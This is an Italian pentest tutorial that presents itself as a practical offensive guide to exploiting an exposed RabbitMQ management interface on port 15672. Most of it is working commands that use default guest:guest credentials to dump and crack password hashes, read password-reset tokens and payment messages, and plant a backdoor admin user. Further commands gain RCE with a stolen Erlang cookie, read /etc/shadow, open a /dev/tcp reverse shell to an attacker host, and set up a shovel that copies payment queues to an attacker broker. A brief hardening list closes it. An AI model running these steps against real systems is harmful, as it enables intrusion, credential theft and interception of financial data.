---
title: 'Porta 15672 RabbitMQ: da guest:guest a RCE con Erlang Cookie'
slug: porta-15672-rabbitmq-web
description: |
  RabbitMQ management esposto sulla 15672? Con guest:guest leggi ogni messaggio in coda, dumpi hash e ottieni RCE via Erlang cookie. Guida offensiva pratica.
image: /porta-15672-rabbitmq-web.webp
draft: true
date: 2026-04-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - message-broker
  - erlang
  - rabbitmq
---

RabbitMQ è il message broker open source più diffuso al mondo: gestisce le code di messaggi tra i servizi di un'applicazione. Quando il sito e-commerce processa un ordine, quel messaggio passa per RabbitMQ. Quando il sistema di notifiche manda un'email, passa per RabbitMQ. Quando il microservizio di pagamento comunica con quello di fatturazione — hai indovinato — passa per RabbitMQ. La porta 15672 TCP è l'interfaccia web di **Management** che permette di monitorare e gestire tutto: code, messaggi, utenti, permessi. E con credenziali di default (`guest:guest`), permette anche di **leggere ogni singolo messaggio in transito**, creare utenti admin e, tramite il cookie Erlang, ottenere RCE sul server.

I messaggi in un broker enterprise contengono dati che normalmente non vedi nemmeno con accesso al database: ordini con dati di pagamento, notifiche con token di reset password, eventi con credenziali di servizio, comandi di sistema con parametri sensibili. Accedere a RabbitMQ è come mettere una microspia nel sistema nervoso dell'applicazione.

Mi è capitato durante un pentest per un'azienda fintech a Milano: RabbitMQ management esposto sulla rete interna con `guest:guest`. Nelle code c'erano messaggi di transazioni bancarie con IBAN, importi e nomi dei beneficiari. Ma il vero colpo è stato trovare una coda chiamata `password-reset-events` — ogni messaggio conteneva l'email dell'utente e il token di reset monouso. Ho resettato la password dell'admin del portale senza inviare una singola richiesta al sito web.

## Cos'è RabbitMQ — Per Chi Non lo Conosce

RabbitMQ implementa il protocollo AMQP (Advanced Message Queuing Protocol): i servizi pubblicano messaggi su **exchange**, che li instradano nelle **code** (queue) secondo regole di binding, e i **consumer** leggono i messaggi dalle code. È il collante tra i microservizi: disaccoppia i componenti, gestisce i picchi di traffico e garantisce che nessun messaggio vada perso.

```
Producer (app)          RabbitMQ                     Consumer (app)
┌──────────────┐       ┌───────────────────────┐     ┌──────────────┐
│ Ordine creato│──AMQP►│ Exchange "orders"      │     │ Payment svc  │
│ (porta 5672) │       │   ├── Queue: payments ─┼──►──│ (porta 5672) │
│              │       │   ├── Queue: invoices ──┼──►──│ Invoice svc  │
│              │       │   └── Queue: notify ────┼──►──│ Email svc    │
│              │       │                         │     │              │
│   MGMT UI    │◄─HTTP─│ Management (:15672)     │     │              │
│ guest:guest  │       │   API REST              │     │              │
└──────────────┘       └───────────────────────┘     └──────────────┘
```

| Porta     | Protocollo | Funzione                                                                 |
| --------- | ---------- | ------------------------------------------------------------------------ |
| 5672      | AMQP       | Protocollo messaggi principale                                           |
| 5671      | AMQPS      | AMQP con TLS                                                             |
| **15672** | HTTP       | Management web UI + REST API                                             |
| 4369      | EPMD       | Erlang Port Mapper (cluster)                                             |
| 25672     | Erlang     | Distribuzione inter-nodo                                                 |
| 15692     | HTTP       | [Prometheus](https://hackita.it/articoli/porta-9090-web-console) metrics |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5672,15672,4369,25672 10.10.10.40
```

### Versione e info

```bash
curl -s http://10.10.10.40:15672/api/overview | python3 -m json.tool
```

Se risponde `401 Unauthorized` → management attivo, serve auth.
Se risponde con JSON → accesso senza credenziali (raro ma possibile).

```bash
# Con credenziali
curl -s -u guest:guest http://10.10.10.40:15672/api/overview | python3 -m json.tool
```

```json
{
    "rabbitmq_version": "3.13.1",
    "erlang_version": "26.2.2",
    "cluster_name": "rabbit@prod-broker-01",
    "message_stats": {
        "publish": 15000000,
        "deliver": 14800000
    },
    "queue_totals": {
        "messages": 3420,
        "messages_ready": 3100
    }
}
```

**Intelligence:** versione RabbitMQ e Erlang (per CVE), nome del cluster (hostname del server), 3420 messaggi in coda pronti per essere letti.

## 2. Default Credentials

RabbitMQ ha un account di default **`guest:guest`** con privilegi **administrator** completi sul vhost `/`. Dal versione 3.3.0 (2014), questo account è **limitato a connessioni da localhost** — ma questa restrizione è spesso rimossa, soprattutto nei deploy Docker.

```bash
# Test da remoto
curl -s -u guest:guest http://10.10.10.40:15672/api/whoami
```

```json
{"name":"guest","tags":["administrator"]}
```

Se risponde → `guest:guest` funziona da remoto. L'azienda ha disabilitato la restrizione localhost (config `loopback_users = none`).

| Username   | Password   | Contesto         |
| ---------- | ---------- | ---------------- |
| `guest`    | `guest`    | Default RabbitMQ |
| `admin`    | `admin`    | Setup custom     |
| `rabbitmq` | `rabbitmq` | Alcune distro    |
| `user`     | `user`     | Ambiente di test |

```bash
# Brute force
hydra -L users.txt -P passwords.txt 10.10.10.40 http-get /api/overview -s 15672
```

## 3. Enumerazione Completa via API

Con credenziali valide, l'API REST espone **tutto**.

### Utenti e password hash

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/users | python3 -m json.tool
```

```json
[
    {
        "name": "guest",
        "password_hash": "4Ot1k...base64...",
        "hashing_algorithm": "rabbit_password_hashing_sha256",
        "tags": ["administrator"]
    },
    {
        "name": "app_producer",
        "password_hash": "9Xz2m...base64...",
        "hashing_algorithm": "rabbit_password_hashing_sha256",
        "tags": []
    },
    {
        "name": "monitoring",
        "password_hash": "7Pw3n...base64...",
        "hashing_algorithm": "rabbit_password_hashing_sha256",
        "tags": ["monitoring"]
    }
]
```

Hash delle password di tutti gli utenti. Il formato RabbitMQ è SHA-256 con un salt di 4 byte prepended, codificato in base64. Per crackare con [Hashcat](https://hackita.it/articoli/hashcat):

```bash
# Decodifica base64 → separa salt (primi 4 byte) e hash
echo 'BASE64_HASH' | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
```

Mode `1420` = `sha256($salt.$pass)`.

### Code (queue) e messaggi

```bash
# Lista tutte le code
curl -s -u guest:guest http://10.10.10.40:15672/api/queues | python3 -m json.tool
```

```json
[
    {"name": "orders.process", "messages": 1200, "consumers": 3, "vhost": "/"},
    {"name": "payments.execute", "messages": 45, "consumers": 2, "vhost": "/"},
    {"name": "notifications.email", "messages": 890, "consumers": 1, "vhost": "/"},
    {"name": "user.password-reset", "messages": 12, "consumers": 1, "vhost": "/"},
    {"name": "system.audit", "messages": 5600, "consumers": 0, "vhost": "/"}
]
```

`system.audit` ha 5600 messaggi e **zero consumer** — nessuno li legge. Potrebbero contenere dati preziosi accumulati.

### Leggere i messaggi da una coda

```bash
# Estrai 10 messaggi (con requeue=true non li rimuovi dalla coda)
curl -s -u guest:guest -H "content-type:application/json" \
  -X POST http://10.10.10.40:15672/api/queues/%2F/user.password-reset/get \
  -d '{"count":10,"requeue":true,"encoding":"auto","truncate":50000}'
```

```json
[
    {
        "payload": "{\"email\":\"admin@corp.com\",\"reset_token\":\"eyJhbG...\",\"expires\":\"2026-02-15T10:00:00Z\"}",
        "routing_key": "password.reset",
        "exchange": "user-events"
    },
    {
        "payload": "{\"email\":\"j.rossi@corp.com\",\"reset_token\":\"eyJ0eX...\",\"expires\":\"2026-02-15T09:30:00Z\"}",
        "routing_key": "password.reset",
        "exchange": "user-events"
    }
]
```

Token di reset password — usali prima della scadenza per reimpostare la password di qualsiasi utente.

**Nota:** `%2F` nel path è il vhost `/` URL-encoded. Ogni vhost deve essere encodato così.

### Connessioni attive

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/connections | python3 -m json.tool
```

Rivela: IP dei client connessi, credenziali usate (username), vhost, canali aperti — mappa di chi usa il broker e da dove.

### Export completo delle definizioni

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/definitions | python3 -m json.tool > rabbitmq_dump.json
```

Contiene **tutto**: utenti con hash, vhost, permessi, exchange, queue, binding, policy, shovel config. È il backup completo di RabbitMQ.

## 4. Creare un Utente Admin Backdoor

```bash
# Crea utente
curl -s -u guest:guest -H "content-type:application/json" \
  -X PUT http://10.10.10.40:15672/api/users/backdoor \
  -d '{"password":"B4ckd00r_2026!","tags":"administrator"}'

# Dai permessi completi sul vhost /
curl -s -u guest:guest -H "content-type:application/json" \
  -X PUT http://10.10.10.40:15672/api/permissions/%2F/backdoor \
  -d '{"configure":".*","write":".*","read":".*"}'
```

Utente admin persistente — anche se cambiano la password di `guest`, il tuo utente resta.

## 5. Erlang Cookie — Da RabbitMQ a RCE

Questo è il vettore più potente. RabbitMQ è scritto in Erlang, e i nodi Erlang si autenticano con un **cookie** condiviso — una stringa di testo salvata in un file. Se ottieni il cookie, puoi connetterti al nodo Erlang e **eseguire comandi di sistema** come l'utente `rabbitmq`.

### Dove trovare il cookie

```bash
# Linux
/var/lib/rabbitmq/.erlang.cookie
~/.erlang.cookie

# Windows
C:\Users\<username>\.erlang.cookie

# Docker (spesso hardcoded o prevedibile)
docker exec <container> cat /var/lib/rabbitmq/.erlang.cookie
```

Come lo ottieni?

* **LFI** in un'altra applicazione sullo stesso server
* **Backup esposti** ([Git](https://hackita.it/articoli/porta-9418-git), [NFS](https://hackita.it/articoli/porta-2049-nfs), [SMB](https://hackita.it/articoli/smb))
* **Docker image inspection** — il cookie è spesso nel layer
* **File read** tramite altra vulnerabilità ([Webmin](https://hackita.it/articoli/porta-10000-webmin), [Tomcat](https://hackita.it/articoli/porta-8080-tomcat) Ghostcat)

### RCE con il cookie

```bash
# Scrivi il cookie rubato
echo "STOLENERLANGCOOKIEVALUE" > ~/.erlang.cookie
chmod 400 ~/.erlang.cookie

# Connettiti al nodo Erlang
erl -name attacker@10.10.10.200 -setcookie STOLENERLANGCOOKIEVALUE \
  -remsh rabbit@prod-broker-01
```

```erlang
%% Esegui comandi
(rabbit@prod-broker-01)1> os:cmd("id").
"uid=122(rabbitmq) gid=130(rabbitmq) groups=130(rabbitmq)\n"

(rabbit@prod-broker-01)2> os:cmd("cat /etc/shadow").
"root:$6$xyz...:19500:0:99999:7:::\n..."

(rabbit@prod-broker-01)3> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'").
```

RCE come utente `rabbitmq`. Per privilege escalation: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc).

```bash
# Metasploit
use exploit/multi/misc/erlang_cookie_rce
set RHOST 10.10.10.40
set RPORT 25672
set COOKIE STOLENERLANGCOOKIEVALUE
set LHOST 10.10.10.200
run
```

La porta 4369 (EPMD) mappa il nome del nodo alla porta effettiva. La porta 25672 è la distribuzione inter-nodo di default.

## 6. Shovel — Redirect Messaggi all'Attaccante

Con accesso management admin, puoi configurare uno **Shovel** che copia i messaggi da una coda del target a un broker sotto il tuo controllo — intercettazione in tempo reale:

```bash
curl -s -u guest:guest -H "content-type:application/json" \
  -X PUT "http://10.10.10.40:15672/api/parameters/shovel/%2F/evil-shovel" \
  -d '{
    "value": {
      "src-protocol": "amqp091",
      "src-uri": "amqp://localhost",
      "src-queue": "payments.execute",
      "dest-protocol": "amqp091",
      "dest-uri": "amqp://attacker:password@10.10.10.200:5672",
      "dest-queue": "stolen-payments"
    }
  }'
```

Ogni messaggio nella coda `payments.execute` viene copiato automaticamente sul tuo broker. Dati di pagamento in tempo reale.

## 7. AMQP (Porta 5672) — Interazione Diretta

```bash
# Nmap
nmap -sV -p 5672 --script amqp-info 10.10.10.40

# Con amqp-tools
apt install amqp-tools
amqp-get -u amqp://guest:guest@10.10.10.40:5672/ -q orders.process

# rabbitmqadmin (scaricabile dal management)
wget http://10.10.10.40:15672/cli/rabbitmqadmin
chmod +x rabbitmqadmin
./rabbitmqadmin -H 10.10.10.40 -u guest -p guest list queues
./rabbitmqadmin -H 10.10.10.40 -u guest -p guest get queue=orders.process count=10
```

## 8. CVE RabbitMQ

| CVE            | Anno | CVSS | Descrizione                                       | Fix             |
| -------------- | ---- | ---- | ------------------------------------------------- | --------------- |
| CVE-2023-46118 | 2023 | 4.9  | DoS via messaggi HTTP API senza limite dimensione | 3.11.24, 3.12.7 |
| CVE-2024-51988 | 2024 | Med  | Queue deletion senza verifica permessi            | Patched         |
| CVE-2025-30219 | 2025 | 6.1  | XSS nella Management UI via vhost name            | 4.0.3, 3.13.8   |

Le CVE di RabbitMQ sono relativamente poche e a basso impatto — il vero vettore è sempre l'accesso con credenziali default e l'Erlang cookie.

## 9. Detection & Hardening

* **Cambia la password di guest** o disabilitalo (`rabbitmqctl delete_user guest`)
* **Non esporre la 15672 su Internet** — management solo via VPN
* **Mantieni la restrizione localhost** per guest (`loopback_users = guest`)
* **Proteggi il cookie Erlang** — permessi `400`, unico per cluster
* **TLS** su 5671 e 15672
* **RBAC** — utenti con permessi minimi sui vhost necessari
* **Firewall** — 4369 e 25672 solo tra nodi del cluster
* **Monitora** creazione utenti e shovel via audit log

## 10. Mini FAQ

**`guest:guest` funziona ancora nel 2026?**
Da localhost sì, è il comportamento di default. Da remoto, solo se qualcuno ha configurato `loopback_users = none` — cosa comunissima nei deploy Docker dove il container è raggiungibile dalla rete. La Docker official image ha una [nota specifica](https://hackita.it/articoli/docker-security) su questo comportamento.

**Cos'è l'Erlang cookie e perché è così pericoloso?**
È una stringa segreta condivisa tra i nodi Erlang di un cluster. Chi la possiede può connettersi come nodo fidato e usare `os:cmd()` per eseguire comandi arbitrari. È l'equivalente di una chiave SSH root per il mondo Erlang — un singolo file di testo che dà accesso completo.

**Come intercetto i messaggi in tempo reale?**
Con accesso admin, crea uno Shovel che redirige i messaggi a un tuo broker. Oppure usa l'API `POST /api/queues/%2F/QUEUE/get` per leggerli uno alla volta. Per il monitoring passivo su AMQP (porta 5672) puoi anche usare `tcpdump` se il traffico non è TLS.

## 11. Cheat Sheet Finale

| Azione         | Comando                                                                                        |
| -------------- | ---------------------------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 5672,15672,4369,25672 target`                                                     |
| Default creds  | `curl -u guest:guest http://target:15672/api/whoami`                                           |
| Versione       | `curl -u guest:guest http://target:15672/api/overview`                                         |
| Lista utenti   | `curl -u guest:guest http://target:15672/api/users`                                            |
| Lista code     | `curl -u guest:guest http://target:15672/api/queues`                                           |
| Leggi messaggi | `curl -X POST .../api/queues/%2F/QUEUE/get -d '{"count":10,"requeue":true,"encoding":"auto"}'` |
| Crea admin     | `curl -X PUT .../api/users/NAME -d '{"password":"...","tags":"administrator"}'`                |
| Permessi       | `curl -X PUT .../api/permissions/%2F/NAME -d '{"configure":".*","write":".*","read":".*"}'`    |
| Dump completo  | `curl .../api/definitions > dump.json`                                                         |
| Connessioni    | `curl .../api/connections`                                                                     |
| Erlang cookie  | `cat /var/lib/rabbitmq/.erlang.cookie`                                                         |
| Erlang RCE     | `erl -name a@IP -setcookie COOKIE -remsh rabbit@TARGET` → `os:cmd("id").`                      |
| MSF Erlang     | `use exploit/multi/misc/erlang_cookie_rce`                                                     |
| AMQP Nmap      | `nmap -p 5672 --script amqp-info target`                                                       |
| Shovel         | `PUT /api/parameters/shovel/%2F/NAME` con `src-queue` e `dest-uri` attaccante                  |

***

Riferimento: RabbitMQ HTTP API Reference, RabbitMQ Access Control docs, Erlang cookie RCE (mubix), HackTricks RabbitMQ. Uso esclusivo in ambienti autorizzati.

> I messaggi della tua azienda transitano in chiaro su RabbitMQ con credenziali di default? [Scoprilo con un penetration test HackIta](https://hackita.it/servizi) prima che lo scopra qualcun altro. Per padroneggiare l'exploitation dei message broker: [mentorship 1:1](https://hackita.it/formazione).
